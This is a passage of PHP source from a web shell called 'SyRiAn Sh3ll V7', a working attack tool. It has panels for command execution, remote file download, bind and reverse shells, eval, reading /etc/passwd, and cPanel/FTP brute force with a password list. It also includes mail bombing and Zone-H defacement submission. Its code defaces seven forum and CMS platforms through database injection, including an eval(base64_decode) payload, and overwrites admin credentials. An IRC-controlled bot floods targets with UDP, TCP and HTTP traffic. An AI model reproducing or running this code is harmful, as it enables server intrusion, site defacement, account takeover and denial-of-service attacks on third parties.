	</td></tr></table></form>
	<!-- End Of Command Line -->
	</td>
	<td width='30%' height=30>
	<!-- Edit File -->
	<form method=POST>
	<table width='100%' height='72' border='0'  id='Box'><tr>
    <td width='12' height='21' style='background-color:".$shellColor."'>&nbsp;</td>
    <td style='background-color:#666;padding-left:10px;'>Edit File </td></tr><tr><td height='45' colspan='2'>
	<input type='text' name='editFile' size=59>
	<input name='editFileSubmit' type='submit' value='Edit'>
	</td></tr></table></form>
	<!-- End Of Edit File -->
	</td>
	</tr>
	<tr>
	<td width='30%'>
	<!-- Chmod Force -->
	<form method=POST><table width='100%' height='72' border='0'  id='Box'><tr>
    <td width='12' height='21' style='background-color:".$shellColor."'>&nbsp;</td>
    <td style='background-color:#666;padding-left:10px;'>Change Mode </td></tr><tr><td height='45' colspan='2'>
	<input type='text' name='fileName' value='index.php' size=48>
	<br/><input type='text' name='per' value='0644' size='10'>
	<input type=submit value='Change Now !' name='changePermission'>
	</td></tr></table></form>
	<!-- End Of Chmod Force -->
	</td>
	<td>
	<!-- Get File -->
	<form method=POST><table width='100%' height='72' border='0'  id='Box'><tr>
    <td width='12' height='21' style='background-color:".$shellColor."'>&nbsp;</td>
    <td style='background-color:#666;padding-left:10px;'>Get File </td></tr><tr><td height='45' colspan='2'>
	<input type='text' name='fileUrl' size='59' value='http://www.'>
	<select name=getType>
	<option value=wget>wget</option>
	<option value='curl -o'>curl -o</option>
	<option value=get>get</option>
	<option value='lynx -source'>lynx -source</option>
	</select>
	<input name=getFile type=submit value='Get File' >
	</td></tr></table></form>
	<!-- End Of Get File -->
	</td>
	<td>
	<!-- Bind Connection -->
	<form method=POST><table width='100%' height='72' border='0'  id='Box'><tr>
    <td width='12' height='21' style='background-color:".$shellColor."'>&nbsp;</td>
    <td style='background-color:#666;padding-left:10px;'>Bind Connection </td></tr><tr><td height='45' colspan='2'>
	<input class='inputz' type='text' name='bind_pass' size='26' value='".gethostbyname($_SERVER["HTTP_HOST"])."'>
	<input type='text' name='port' size='26' value='443'>
	<select class='inputz' size='1' name='use'>
	<option value='Perl'>Perl</option><option value='C'>C</option>
	</select> 
	<input class='inputzbut' type='submit' name='bind' value='Bind' style='width:120px'>
	</td></tr></table></form>
	<!-- End Of Bind Connection -->	
	</td>
	</tr>
	<tr>
	<td>
	<!-- CGI perl -->
	<form method=POST><table width='100%' height='72' border='0'  id='Box'><tr>
    <td width='12' height='21' style='background-color:".$shellColor."'>&nbsp;</td>
    <td style='background-color:#666;padding-left:10px;'>CGI Perl </td></tr><tr><td height='45' colspan='2'>
	<input type='text' value='".getcwd()."' name='cgiperlPath' size='43'>
	<input type='submit' name='generatePel' value='Generate'></td></tr></table></form>
	<!-- End Of CGI perl -->
	</td><td>
	<!-- Forbidden -->
	<form method=POST><table width='100%' height='72' border='0'  id='Box'><tr>
    <td width='12' height='21' style='background-color:".$shellColor."'>&nbsp;</td>
    <td style='background-color:#666;padding-left:10px;'>Forbidden </td></tr><tr><td height='45' colspan='2'>
	<input type='text' value='".getcwd()."' name='forbiddenPath' size='70%'/>
	<select name='403'>
	<option value='DirectoryIndex'>DirectoryIndex</option>
	<option value='HeaderName'>HeaderName</option>
	<option value='TXT'>TXT</option>
	<option value='404'>404</option>
	<option value='ReadmeName'>ReadmeName</option>
	<option value='footerName'>footerName</option> 
	</select>
	<input type='submit' value='Generate' name='generateForbidden'>
	</td></tr></table></form>
	<!-- End Of Forbidden -->
	</td>
	<td>
	<!-- Back Connection -->
	<form method=POST><table width='100%' height='72' border='0'  id='Box'><tr>
    <td width='12' height='21' style='background-color:".$shellColor."'>&nbsp;</td>
    <td style='background-color:#666;padding-left:10px;'>Back Connection </td></tr><tr><td height='45' colspan='2'>
	<input type='text' name='ip' size='26' value='".GetRealIP()."'>
	<input type='text' name='backport' size='26' value='443'>
	<select name='use'>
	<option value='Perl'>Perl</option>
	<option value='C'>C</option>
	</select> 
	<input type='submit' name='backconn' value='Connect'>
	</td></tr></table></form>
	<!-- End Of Back Connection -->
	</td>
	</tr>
	<tr>
	<td>
	<form method=POST><table width='100%' height='72' border='0'  id='Box'><tr>
    <td width='12' height='21' style='background-color:".$shellColor."'>&nbsp;</td>
    <td style='background-color:#666;padding-left:10px;'>Hash Analyzer </td></tr><tr><td height='45' colspan='2'>
	<input type='text' name='hashToAnalyze' size=60>
	<input type='submit' value='Analyze Now' name='analyzieNow'></td></tr></table></form>
	</td>
	<td>
	<!-- Eval Code -->
	<form method=POST><table width='100%' height='72' border='0'  id='Box'><tr>
    <td width='12' height='21' style='background-color:".$shellColor."'>&nbsp;</td>
    <td style='background-color:#666;padding-left:10px;'>Eval Code </td></tr><tr><td height='45' colspan='2'>
	<input type='text' name='php_eval' size='70' value='echo \"SyRiAn Sh3ll V7\";'> 
	<input type=submit name=submitEval value=Eval></td></tr></table></form>
	<!-- End Of Eval Code -->
	</td>
	<td>
	<!-- Users & Domains -->
	<form method=POST><table width='100%' height='72' border='0'  id='Box'><tr>
    <td width='12' height='21' style='background-color:".$shellColor."'>&nbsp;</td>
    <td style='background-color:#666;padding-left:10px;'>Users & Domains </td></tr><tr><td height='45' colspan='2'>
	<input type='text' name='usersPath' value='".getcwd()."' size='55'/>
	<input type='submit' name='GenerateUsers' Value='Generate'>
	<!-- End Of Users & Domains -->
	</td></tr></table></form>
	</td>
	</tr>
	<tr>
	<td>
	<!-- Reading Files -->
	<form method=POST><table width='100%' height='72' border='0'  id='Box'><tr>
    <td width='12' height='21' style='background-color:".$shellColor."'>&nbsp;</td>
    <td style='background-color:#666;padding-left:10px;'>Reading Files & Dir Using PHP Bugs </td></tr><tr><td height='45' colspan='2'>
	<input type='text' value='/etc/passwd' name='file' size=35>
	<input class='buttons' type='submit' name='read' value='Read File'>
	<input class='buttons' type='submit' name='show' value='Show directory'>
	</td></tr></table></form>
	<!-- End Of Reading Files -->
	</td>
	<td>
	<!--Encryption -->
	<form method=POST><table width='100%' height='72' border='0'  id='Box'><tr>
    <td width='12' height='21' style='background-color:".$shellColor."'>&nbsp;</td>
    <td style='background-color:#666;padding-left:10px;'>Encryption </td></tr><tr><td height='45' colspan='2'>
	<input type='text' value='SyRiAn_Sh3ll' name='ENCRYPTION' size='80%'>
	<input type='submit' value='Encrypt' name='encryptNow'>
	</td></tr></table></form>
	<!-- End Of Encryption -->
	</td>
	<td>
	<!-- Metasploit RC -->
	<form method=POST><table width='100%' height='72' border='0'  id='Box'><tr>
    <td width='12' height='21' style='background-color:".$shellColor."'>&nbsp;</td>
    <td style='background-color:#666;padding-left:10px;'>Metasploit Connection </td></tr><tr><td height='45' colspan='2'>
	<input type='text' size='15' name='ip' value='127.0.0.1'>
	<input type='text' size='5' name='port' value='443'>
	<input type='submit' value='Connect' name='metaConnect'>
	</td></tr></table></form>
	<!-- End Of Metasploit RC -->
	</td>
	</tr>
	<tr>
	<td>
	<!-- DDOS Attacker -->
	<form method=POST><table width='100%' height='72' border='0'  id='Box'><tr>
    <td width='12' height='21' style='background-color:".$shellColor."'>&nbsp;</td>
    <td style='background-color:#666;padding-left:10px;'>DDOS Attacker </td></tr><tr><td height='45' colspan='2'>
	<input type='text' name='ipToAttack' size='40' value='Target IP'>
	<input type='text' name='portToAttack' size='20' value='Target PORT'>
	<input type='submit' name='StartAttack' value='Attack'>
	</td></tr></table></form>
	<!-- End Of DDOS Attacker -->
	</td>
	<td>
	<!-- Ports Scanner -->
	<form method=POST><table width='100%' height='72' border='0'  id='Box'><tr>
    <td width='12' height='21' style='background-color:".$shellColor."'>&nbsp;</td>
    <td style='background-color:#666;padding-left:10px;'>Ports Scanner </td></tr><tr><td height='45' colspan='2'>
	<input type='text' name='domainToScanPort' size='50' value='172.0.0.1'> <input type='submit' name='submitDomainToScanPort' Value='Scan Now'>
	</td></tr></table></form>
	<!-- End Of Ports Scanner -->
	</td>
	<td>
	<!-- ACP Finder -->
	<form method=POST><table width='100%' height='72' border='0'  id='Box'><tr>
    <td width='12' height='21' style='background-color:".$shellColor."'>&nbsp;</td>
    <td style='background-color:#666;padding-left:10px;'>ACP Finder </td></tr><tr><td height='45' colspan='2'>
	<input name='hash_lol' class='textbox' type='text' size='30' value='http://www.example.com/'/>
	<input type='text' value='.php' name='extention'/>
	<input name='submit_lol' class='textbox' value='Brute Force Now' type='submit'>
	<!-- End Of ACP Finder -->
	</td></tr></table></form>
	</td>
	</tr>
	
	<tr>
	<br>
	<td valign='top'>
	<!-- Server ShortCut -->
	<form method=POST><table width='100%' height='72' border='0'  id='Box'><tr>
    <td width='12' height='21' style='background-color:".$shellColor."'>&nbsp;</td>
    <td style='background-color:#666;padding-left:10px;'>Server ShortCut </td></tr><tr><td height='45' colspan='2'>
	<input type='text' value='".getcwd()."' size='68' name='ShourtCutPath'>
	<input type='submit' name='generateSER' value=' Generate '>
	</td></tr></table></form>
	<!-- End Of Server ShoutCut -->
	</td>
	<td valign='top'>
	<!-- Fast Tools -->
	<form method=POST><table width='100%' height='72' border='0'  id='Box'><tr>
    <td width='12' height='21' style='background-color:".$shellColor."'>&nbsp;</td>
    <td style='background-color:#666;padding-left:10px;'>Fast Tools </td></tr><tr><td height='45' colspan='2'>
	<input type=submit value='Generate .HTAccess' name='htaccessGenerate'>
	<input type=submit value='Generate php.ini' name='phpiniGenerate'>
	<input type=submit value='Generate ini.php' name='iniphpGenerate'><br/><br/>
	<input type='submit' value='Finding Config Files' name='configFinderSubmit' />
	<input type='submit' name='showUsers' value='Show Users' />
	</td></tr></table></form>
	<!-- End Of Fast Tools -->
	</td>
	<td valign='TOP'>
	<!-- SQL Reader -->
	<form method=POST><table width='100%' height='72' border='0'  id='Box'><tr>
    <td width='12' height='21' style='background-color:".$shellColor."'>&nbsp;</td>
    <td style='background-color:#666;padding-left:10px;'>SQL Reader</td></tr><tr><td height='45' colspan='2'>
	<input type='text' value='/etc/passwd' name='file' size='35'><br/>
	<input type='text' name='host' value='127.0.0.1'>
	<input type='text' name='user' value='DB user'>
	<input type='text' name='pass' value='DB pass'>
	<input type=text name='db' value='DB name'>
	<input type='submit' name='sql2Read' value='Read'>
	";
	if($sql_con)
	{
		echo '<input style="width:300px;" type="text" name="filetoread">
		<input type="submit" value="Read" name="SQLToRead">';
	}
	echo "</td></tr></table></form>
	<!-- End Of SQL Reader  -->
	</td>
	</tr>
	<tr>
	<td valign='top'>
		<!-- Mail Storm -->
	<form method=POST><table width='100%' height='72' border='0'  id='Box'><tr>
    <td width='12' height='21' style='background-color:".$shellColor."'>&nbsp;</td>
    <td style='background-color:#666;padding-left:10px;'>Mail Storm </td></tr><tr><td height='45' colspan='2'>
	<textarea rows='5' cols='45' name='Comments' >Attacker Message</textarea>
	<input type='text' name='to' value='Target Email' >
	<input type='text' size='5' name='nom' value='100'>
	<input name='sendMailStorm' type='submit' value='Send Mail Storm ' >
	</td></tr></table></form>
	<!-- End Of Mail Storm -->
	</td>
	<td valign='top'>
	<!-- SQL Query -->
	<form method=POST><table width='100%' height='72' border='0'  id='Box'><tr>
    <td width='12' height='21' style='background-color:".$shellColor."'>&nbsp;</td>
    <td style='background-color:#666;padding-left:10px;'>SQL Query</td></tr><tr><td height='45' colspan='2'>
	<input type = 'text' name=\"QU_HOST\" value='127.0.0.1'>
	<input type = 'text' name=\"QU_USER\" value='DB User'><br/>
	<input type = 'text' name=\&quot;QU_PASS\&quot; value='DB Pass'>
	<input type=text name=\&quot;QU_DB\&quot; value='DB Name' >
	<textarea name='QU'  rows=2 cols=50>SELECT * FROM emp ;</textarea>
	<input name='MySQLQuery' type='submit'>
	</td></tr></table></form>
	<!-- SQL Query  -->
	</td>
	<td valign='top'>
	<!-- Email Extractor -->
	<form method=POST><table width='100%' height='72' border='0'  id='Box'><tr>
    <td width='12' height='21' style='background-color:".$shellColor."'>&nbsp;</td>
    <td style='background-color:#666;padding-left:10px;'>Email Extractor</td></tr><tr><td height='45' colspan='2'>
	<input type = 'text' name='EM_HOST' value='127.0.0.1'>
    <input type='text' name='EM_USER' value='DB user'>
	<input type ='text' name='EM_PASS' value='DB pass'>
    <input type='text' name='EM_DB' value='DB name'>
	<input type ='text' name='EM_TABLE' value='users Table'>
	<input type ='text' name='EM_COLUMN' value='emails Column'><br/>
	<input name='getEmails' type='submit' id='submit' style='font-weight: value=Extract now !'>
	<input type='submit' value='?' name='emailExtractorHelp'  alt='Email Extractor Help'/>
	</td></tr></table></form>
	<!-- End Of Email Extractor -->
	</td>
	</tr>
	<tr>
	<td valign='top'>
	<!-- Zone-H -->
	<form method=POST><table width='100%' height='72' border='0'  id='Box'><tr>
    <td width='12' height='21' style='background-color:".$shellColor."'>&nbsp;</td>
    <td style='background-color:#666;padding-left:10px;'>Zone-H Defacer</td></tr><tr><td height='45' colspan='2'>";
	echo '<form action="" method="post">
<input type="text" name="defacer" size="40" value="Attacker" />
<select name="hackmode">
<option >--------SELECT--------</option>
<option value="1">known vulnerability (i.e. unpatched system)</option>
<option value="2" >undisclosed (new) vulnerability</option>
<option value="3" >configuration / admin. mistake</option>
<option value="4" >brute force attack</option>
<option value="5" >social engineering</option>
<option value="6" >Web Server intrusion</option>
<option value="7" >Web Server external module intrusion</option>
<option value="8" >Mail Server intrusion</option>
<option value="9" >FTP Server intrusion</option>
<option value="10" >SSH Server intrusion</option>
<option value="11" >Telnet Server intrusion</option>
<option value="12" >RPC Server intrusion</option>
<option value="13" >Shares misconfiguration</option>
<option value="14" >Other Server intrusion</option>
<option value="15" >SQL Injection</option>
<option value="16" >URL Poisoning</option>
<option value="17" >File Inclusion</option>
<option value="18" >Other Web Application bug</option>
<option value="19" >Remote administrative panel access bruteforcing</option>
<option value="20" >Remote administrative panel access password guessing</option>
<option value="21" >Remote administrative panel access social engineering</option>
<option value="22" >Attack against administrator(password stealing/sniffing)</option>
<option value="23" >Access credentials through Man In the Middle attack</option>
<option value="24" >Remote service password guessing</option>
<option value="25" >Remote service password bruteforce</option>
<option value="26" >Rerouting after attacking the Firewall</option>
<option value="27" >Rerouting after attacking the Router</option>
<option value="28" >DNS attack through social engineering</option>
<option value="29" >DNS attack through cache poisoning</option>
<option value="30" >Not available</option>
</select>

<select name="reason">
<option >--------SELECT--------</option>
<option value="1" >Heh...just for fun!</option>
<option value="2" >Revenge against that website</option>
<option value="3" >Political reasons</option>
<option value="4" >As a challenge</option>
<option value="5" >I just want to be the best defacer</option>
<option value="6" >Patriotism</option>
<option value="7" >Not available</option>
</select>
<textarea name="domain" cols="44" rows="9">List Of Domains</textarea>
<input type="submit" value="Send Now !" name="SendNowToZoneH" />
</form>';
	echo "</td></tr></table></form>
	<!-- End Of Zone-H -->
	</td>
	<td valign='top'>
	<!-- Cpanel And FTP BruteForce Attacker -->
		<form method=POST><table width='100%' height='72' border='0'  id='Box'><tr>
    <td width='12' height='21' style='background-color:".$shellColor."'>&nbsp;</td>
    <td style='background-color:#666;padding-left:10px;'>Cpanel And FTP BruteForce </td></tr><tr><td height='45' colspan='2'>
	<textarea rows='12' name='users' cols='23' >";
	@system('ls /var/mail');
	echo "</textarea>
	<textarea rows='12' name='passwords' cols='23' >123123\n123456\n1234567\n12345678\n123456789\n159159\n112233\n332211\n!@#$%^\n^%$#@!.\n!@#$%^&\n!@#$%^&*\n!@#$

%^&*(\npassword\npasswd\npasswords\npass\np@assw0rd\npass@word1
	</textarea>
	<input type='text' name='target' size='16' value='127.0.0.1' >
	<input name='cracktype' value='cpanel' checked type='radio'><sy>Cpanel (2082)</sy>
	<input name='cracktype' value='ftp' type='radio'><sy>Ftp (21)</sy>
	<input type='submit' value='   Crack it !   ' name='BruteForceCpanelAndFTP' >
	</td></tr></table></form>
	<!-- End Of Cpanel And FTP BruteForce Attacker -->
	</td>
	<td valign='top'>
	<!-- Upload Files -->
	<form enctype=\"multipart/form-data\" method=\"POST\"><table width='100%' height='72' border='0'  id='Box'><tr>
    <td width='12' height='21' style='background-color:".$shellColor."'>&nbsp;</td>
    <td style='background-color:#666;padding-left:10px;'>Upload Files </td></tr><tr><td height='45' colspan='2'>
	<input type=\"file\" name=\"uploadfile[]\">
	<input type=\"file\" name=\"uploadfile[]\">
	<input type=\"file\" name=\"uploadfile[]\">
	<input type=\"file\" name=\"uploadfile[]\">
	<input type=\"file\" name=\"uploadfile[]\">
	<input type=\"file\" name=\"uploadfile[]\">
	<input type=\"file\" name=\"uploadfile[]\">
	<input type=\"file\" name=\"uploadfile[]\">
	<input type=\"file\" name=\"uploadfile[]\">
	<input type=\"file\" name=\"uploadfile[]\">
	<input type=\"submit\" value=\"Upload Files\" name='UploadNow'>
	</td></tr></table></form>
	<!-- End Of Upload Files -->
	</td></tr>
	</table>
	";
	if($_POST['changeDirectory'])
	{
		$directory = $_POST['directory'];
		$directory = @str_replace("\\\\"," ",$directory);
		$directory = @str_replace(" ","\\",$directory);
		@chdir($directory);
	}	
	if($_POST['getFile'])
	{
		$fileUrl = $_POST['fileUrl'];
		$getType = $_POST['getType'];
		Exe("'".$getType.$fileUrl."'");
	}
footer();
}
# ---------------------------------------#
#            IndexChanger                #
#----------------------------------------#
if ($_GET['id']== 'scriptsHack' )
{
	echo "
	<table width='100%'>
		<tr>
		<td colspan='2'><textarea cols='153' rows='10'>";
		if($_POST['UpdateIndex'] || $_POST['changeInfo'] )
		{
			$host = $_POST['HOST'];
			$user = $_POST['USER'];
			$pass = $_POST['PASS'];
			$db   = $_POST['DB'];
			$index = $_POST['INDEX'];
			$prefix  = $_POST['PREFIX'];
			if (empty($_POST['HOST']))
			$host = '127.0.0.1';
			$index=str_replace("\'","'",$index);
			@mysql_connect($host,$user,$pass) or die( "[-] Unable TO Connect DATABASE ! Username Or Password Is Wrong !!");
			@mysql_select_db($db) or die ("[-] Database Name Is Wrong !!");
			
			if($_POST['UpdateIndex'])
			{	
				if ($_POST['ScriptType'] == 'vb')
				{
					$full_index  = "{\${eval(base64_decode(\'";
					$full_index .= base64_encode("echo \"$index\";");
					$full_index .= "\'))}}{\${exit()}}</textarea>";
					if($_POST['injectFAQ'])
					{
						$injectfaq = @mysql_query("UPDATE template SET template ='".$full_index."' WHERE title ='faq'");
					}
					else 
					{
						$ok1 = mysql_query("UPDATE template SET template ='".$full_index."' WHERE title ='forumhome'");
						if (!$ok1)
						{
							$ok2 = mysql_query("UPDATE template SET template ='".$full_index."' WHERE title ='header'");
						}
						elseif (!$ok2)
						{
							$ok3 = mysql_query("UPDATE template SET template ='".$full_index."' WHERE title ='spacer_open'"); 
						}
						elseif(!$ok3)
						{
							$ok4 = @mysql_query("UPDATE template SET template ='".$full_index."' WHERE title ='faq'");
						}
					}
					mysql_close();
					if ($ok1 || $ok2 || $ok3 || $ok4 || $injectfaq )
					{
						update();
					}
					else 
					{
						echo "Updating Has Failed !";
					}
				}
				else if ($_POST['ScriptType'] == 'wp')
				{
					$tableName = $prefix."posts" ;
					$ok1 = mysql_query("UPDATE $tableName SET post_title ='".$index."' WHERE ID > 0 ");
					if(!$ok1)
					{
						$ok2 = mysql_query("UPDATE $tableName SET post_content ='".$index."' WHERE ID > 0 "); 
					}
					elseif(!$ok2)
					{
						$ok3 = mysql_query("UPDATE $tableName SET post_name ='".$index."' WHERE ID > 0 "); 
					}
					mysql_close();
					if ($ok1 || $ok2 || $ok3)
					{
						update();
					}
					else 
					{
						echo "Updating Has Failed !";
					}
				}
				else if ($_POST['ScriptType'] == 'jos')
				{
					$jos_table_name = $prefix."menu" ;
					$jos_table_name2 = $prefix."modules" ;
					$ok1 = mysql_query("UPDATE $jos_table_name SET name ='".$index."' WHERE ID > 0 ");
					if(!$ok1)
					{
						$ok2 = mysql_query("UPDATE $jos_table_name2 SET title ='".$index."' WHERE ID > 0 ");
					}
					mysql_close();
					if ($ok1 || $ok2 || $ok3)
					{
						update();
					}
					else 
					{
						echo "Updating Has Failed !";
					}
				}
				else if ($_POST['ScriptType'] == 'phpbb')
				{
					$php_table_name = $prefix."forums";
					$php_table_name2 = $prefix."posts";
					$ok1 = mysql_query("UPDATE $php_table_name SET forum_name ='.$index.' WHERE forum_id > 0 ");
					if(!$ok1)
					{
						$ok2 = mysql_query("UPDATE $php_table_name2 SET post_subject ='.$index.' WHERE post_id > 0 "); 
					}
					mysql_close();
					if ($ok1 || $ok2 || $ok3)
					{
						update();
					}
					else 
					{
						echo "Updating Has Failed !";
					}
				}
				else if ($_POST['ScriptType'] == 'ipb')
				{
					$ip_table_name = $prefix."components" ;
					$ip_table_name2 = $prefix."forums" ;
					$ip_table_name3 = $prefix."posts" ;
					$ok1 = mysql_query("UPDATE $ip_table_name SET com_title ='".$index."' WHERE com_id > 0");
					if(!$ok1)
					{
						$ok2 = mysql_query("UPDATE $ip_table_name2 SET name ='".$index."' WHERE id  > 0"); 
					}
					if(!$ok2)
					{
						$ok3 = mysql_query("UPDATE $ip_table_name3 SET post  ='".$IP_INDEX."' WHERE pid <10")  or die("Can't Update Templates 

!!"); 
					}
					mysql_close();
					if ($ok1 || $ok2 || $ok3)
					{
						update();
					}
					else 
					{
						echo "Updating Has Failed !";
					}
				}
				else if ($_POST['ScriptType'] == 'smf')
				{
					$table_name = $prefix."boards" ;
					{
						$ok1 = mysql_query("UPDATE $table_name SET description ='.$index.' WHERE ID_BOARD > 0");
					}
					if(!$ok1)
					{
						$ok2 = mysql_query("UPDATE $table_name SET name ='.$index.' WHERE ID_BOARD > 0");
					}
					mysql_close();
					if ($ok1 || $ok2)
					{
						update();
					}
					else 
					{
						echo "Updating Has Failed !";
					}
				}
				else if ($_POST['ScriptType'] == 'mybb')
				{
					$mybb_prefix = $prefix."templates";
					$ok1 = mysql_query(" update $mybb_prefix set template='".$index."' where title='index' ");
					if ($ok1)
					{
						update();
					}
					else 
					{
						echo "Updating Has Failed !";
					}
					mysql_close();
				}
			}
			elseif($_POST['changeInfo'])
			{	
				$adminID = $_POST['adminID'];
				$userName = $_POST['userName'];
				$password = $_POST['password'];
				if($_POST['ScriptType'] == 'vb')
				{
					//VB Code 
					$password = md5($password);
					$tryChaningInfo = @mysql_query("UPDATE user SET username = '".$userName."' , password = '".$password."' WHERE userid = ".

$adminID."");
					if($tryChaningInfo)
					{update();}
					else {mysql_error();}
				}
				else if($_POST['ScriptType'] == 'wp')
					{
						//WoredPress
						$password = crypt($password); 
						$tryChaningInfo = @mysql_query("UPDATE wp_users SET user_login = '".$userName."' , user_pass = '".$password."' WHERE ID 

= ".$adminID."");
						if($tryChaningInfo)
						{update();}
						else {mysql_error();}
					}
					else if($_POST['ScriptType'] == 'jos')
					{
						//Joomla 
						$password = crypt($password); 
						$tryChaningInfo = @mysql_query("UPDATE jos_users SET username ='".$userName."' , password = '".$password."' WHERE ID = 

".$adminID."");
						if($tryChaningInfo)
						{update();}
						else {mysql_error();}
					}
						else if($_POST['ScriptType'] == 'phpbb')
						{
							//PHPBB3
							$password = md5($password); 
							$tryChaningInfo = @mysql_query("UPDATE phpbb_users SET username ='".$userName."' , user_password = '".

$password."' WHERE user_id = ".$adminID."");
							if($tryChaningInfo)
							{update();}
							else {mysql_error();}
						}
							else if($_POST['ScriptType'] == 'ibf')
							{
								//IPBoard 
								$password = md5($password); 
								$tryChaningInfo = @mysql_query("UPDATE ibf_members SET name ='".$userName."' , member_login_key = '".

$password."' WHERE id = ".$adminID."");
								if($tryChaningInfo)
								{update();}
								else {mysql_error();}
							}
								else if($_POST['ScriptType'] == 'smf')
								{
									//SMF
									$password = md5($password); 
									$tryChaningInfo = @mysql_query("UPDATE smf_members SET memberName ='".$userName."' , passwd = 

'".$password."' WHERE ID_MEMBER = ".$adminID."");
									if($tryChaningInfo)
									{update();}
									else {mysql_error();}
								}
									else if($_POST['ScriptType'] == 'mybb')
									{
										//MyBB
										$password = md5($password); 
										$tryChaningInfo = @mysql_query("UPDATE mybb_users SET username ='".$userName."' , 

password = '".$password."' WHERE uid = ".$adminID."");
										if($tryChaningInfo)
										{update();}
										else {mysql_error();}
									}
				}
				/////////////////////////
				}
				else if($_POST['Decrypt'])
				{
					DecryptConfig();
				}
		
		
		echo "</textarea></td></tr>
			<td width='50%'>
			<form method='POST'>
			<table width='100%' height='72' border='0'  id='Box'>
				<tr>
    				 <td width='12' height='21' style='background-color:".$shellColor."'>&nbsp;</td>
    				<td style='background-color:#666;padding-left:10px;' >Scripts Hacking </td>
				</tr>
				<tr>
					<td height='45' colspan='2'>
						<input type = 'text' name='HOST' value='localhost'>
						<input type = 'text' name='USER' value='DB Username'>
						<input type = 'text' name='PASS' value='DB Password'>
						<input type=text name='DB' value='DB Name'>
						<input type=text name='PREFIX' value='Prefix'>
						<select name='ScriptType' >
						<option value='vb'>VBulletin</option>
						<option value='wp'>WordPress</option>
						<option value='jos'>Joomla</option>
						<option value='ipb'>IP.Board</option>
						<option value='phpbb'>PHPBB</option>
						<option value='mybb'>MyBB</option>
						<option value='smf'>SMF</option>
						</select>
						<br />
						<sy>Inject Shell In FAQ.php ? <input type='checkbox' name='injectFAQ'> [ VB Only ]</sy><br />
						<textarea name='INDEX' rows=14 cols=64 >Put Your Index Here !</textarea>
						<input type='submit' value='Hack Now !!' name='UpdateIndex' >
					</td>
				</tr>
			</table>
			<td width='50%' valign='top'>
                <table width='100%' height='72' border='0'  id='Box'>
                    <tr>
                        <td width='12' height='21' style='background-color:".$shellColor."'>&nbsp;</td>
                        <td style='background-color:#666;padding-left:10px;'>Decrypting Configs </td>
                    </tr>
                    <tr>
                        <td height='45' colspan='2'>
                            <sy>Please Put Config In The Shell Directory With The Name [ DecryptConfig.php ]</sy>
                            <input value=Decrypt name='Decrypt' type='submit' id='Decrypt' value='Decrypt Now !!'>
                        </td>
                    </tr>
                </table>
                <table width='100%' height='72' border='0'  id='Box'>
                    <tr>
                        <td width='12' height='21' style='background-color:".$shellColor."'>&nbsp;</td>
                        <td style='background-color:#666;padding-left:10px;'>Changing Admin Info </td></tr><tr><td height='45' colspan='2'>
                          <input name='adminID' type='text' id='adminID' value='admin id ~= 1'>
                          <input name='userName' type='text' id='userName' value='username'>
                          <input name='password' type='text' id='password' value='password ( Not Encrypted !)'>
                          <input type='submit' name='changeInfo' value='Change Now !'>
                          </td>
                    </tr>
                 </table>
            </form>
</td>
</tr></table>";
footer();

}

# ---------------------------------------#
#             DDos Attacker ...          #
#----------------------------------------#
if($_POST['StartAttack'])
{
	$server=$_POST['ipToAttack'];
	$Port=$_POST['portToAttack'];
	$nick="bot-";$willekeurig;
	$willekeurig=@mt_rand(0,3);
	$nicknummer=@mt_rand(100000,999999);
	$Channel="#WauShare";
	$Channelpass="ddos";
	$msg="Farewell.";

	@set_time_limit(0);
	$loop = 0;
	$verbonden = 0;
	$verbinden = fsockopen($server, $Port);
	while ($read = fgets($verbinden,512)) 
	{
		$read = str_replace("\n","",$read); 
		$read = str_replace("\r","",$read);
		$read2 = explode(" ",$read);
		if ($loop == 0) 
		{
			fputs($verbinden,"nick $nick$nicknummer\n\n");
			fputs($verbinden,"USER cybercrime 0 * :woopie\n\n");
		}
		if ($read2[0] == "PING") 
		{ 
			fputs($verbinden,'PONG '.str_replace(':','',$read2[1])."\n"); 
		}
		if ($read2[1] == 251)
		{
			fputs($verbinden,"join $Channel $Channelpass\n");
			$verbonden++;
		}
		if (eregi("bot-op",$read)) 
		{
			fputs($verbinden,"mode $Channel +o $read2[4]\n");
		}
		if (eregi("bot-deop",$read)) 
		{
			fputs($verbinden,"mode $Channel -o $read2[4]\n");
		}
		
		if (eregi("bot-quit",$read)) 
		{
			fputs($verbinden,"quit :$msg\n\n");
			break;
		}
		if (eregi("bot-join",$read)) 
		{
			fputs($verbinden,"join $read2[4]\n");
		}
		if (eregi("bot-part",$read))
		{
			fputs($verbinden,"part $read2[4]\n");
		}
		if (eregi("ddos-udp",$read)) 
		{
			fputs($verbinden,"privmsg $Channel :ddos-udp - started udp flood - $read2[4]\n\n");
			$fp = fsockopen("udp://$read2[4]", 500, $errno, $errstr, 30);
			if (!$fp)
			{
				exit;
			}
			else
			{
				$char = "a";
				for($a = 0; $a < 9999999999999; $a++)
				$data = $data.$char;
				if(fputs ($fp, $data) )
				 {
					fputs($verbinden,"privmsg $Channel :udp-ddos - packets sended.\n\n");
				 }
				 else
				 {
					fputs($verbinden,"privmsg $Channel :udp-ddos - <error> sending packets.\n\n");
				 }
			}
		}
		if (eregi("ddos-tcp",$read)) 
		{
			fputs($verbinden,"part $read2[4]\n");
			fputs($verbinden,"privmsg $Channel :tcp-ddos - flood $read2[4]:$read2[5] with $read2[6] sockets.\n\n");
			$server = $read2[4];
			$Port = $read2[5];
			for($sockets = 0; $sockets < $read2[6]; $sockets++)
			{
				$verbinden = fsockopen($server, $Port);
			}
		}
		if (eregi("ddos-http",$read)) 
		{
			fputs($verbinden,"part $read2[4]\n");
			fputs($verbinden,"privmsg $Channel :ddos-http - http://$read2[4]:$read2[5] $read2[6] times\n\n");
			$Webserver = $read2[4];
			$Port = $read2[5];
			
			$Aanvraag = "GET / HTTP/1.1\r\n";
			$Aanvraag .= "Accept: */*\r\n";
			$Aanvraag .= "Accept-Language: nl\r\n";
			$Aanvraag .= "Accept-Encoding: gzip, deflate\r\n";
			$Aanvraag .= "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n";
			$Aanvraag .= "Host: $read2[4]\r\n";
			$Aanvraag .= "Connection: Keep-Alive\r\n\r\n";
			
			for($Aantal = 0; $Aantal < $read2[6]; $Aantal++)
			{
				$DoS = fsockopen($Webserver, $Port);
				fwrite($DoS, $Aanvraag);
				fclose($DoS);
			}
		}
	$loop++;
	}
}
# ---------------------------------------#
#              InBoX Mailer              #
#----------------------------------------#
if ($_GET['id']== 'spamming' )
{
	$secure = "";
	error_reporting(0);
	@$action=$_POST['action'];
	@$from=$_POST['from'];
	@$realname=$_POST['realname'];
